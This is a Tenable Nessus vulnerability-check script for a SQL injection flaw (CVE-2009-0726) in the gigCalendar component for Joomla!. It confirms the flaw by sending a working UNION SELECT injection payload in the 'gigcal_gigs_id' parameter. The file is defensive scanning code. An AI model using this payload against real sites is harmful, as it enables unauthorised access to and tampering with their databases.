#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(35474);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2009-0726");
  script_bugtraq_id(33241);
  script_osvdb_id(52257);
  script_xref(name:"EDB-ID", value:"7746");

  script_name(english:"gigCalendar Component for Joomla! 'gigcal_gigs_id' Parameter SQLi");
  script_summary(english:"Exploits a SQL Injection Vulnerability in gigCalendar.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the gigCalendar component for Joomla! running on the
remote host is affected by a SQL injection vulnerability in the
gigdetails.php script due to improper sanitization of user-supplied
input to the 'gigcal_gigs_id' parameter before using it to construct
database queries. Provided the PHP 'magic_quotes_gpc' setting is
disabled, an unauthenticated, remote attacker can exploit this issue
to manipulate database queries, resulting in disclosure of sensitive
information, modification of data, or other attacks against the
underlying database.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"plugin_publication_date",value:"2009/01/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "gigCalendar";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('<name>gigCal', '__gigcal');
  checks["/administrator/components/com_gigcal/gigcal.xml"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# Try to exploit the issue
magic = SCRIPT_NAME - ".nasl";
exploit = "concat(";

for (i=0; i<strlen(magic); i++)
  exploit += hex(ord(magic[i])) + ",";
exploit[strlen(exploit)-1] = ")";

exploit = "'+and+1=2/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8," + exploit +
  ",0,11,12/*";

url = "/index.php?option=com_gigcal&task=details&gigcal_gigs_id="+exploit;

res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

# If we see our magic and Joomla component
if (
  magic >< res[2] &&
  'class="gigcal_menu' >< res[2]
)
{
  output = strstr(res[2], magic);
  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    sqli        : TRUE,
    generic     : TRUE,
    request     : make_list(install_url + url),
    output      : chomp(output)
  );
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
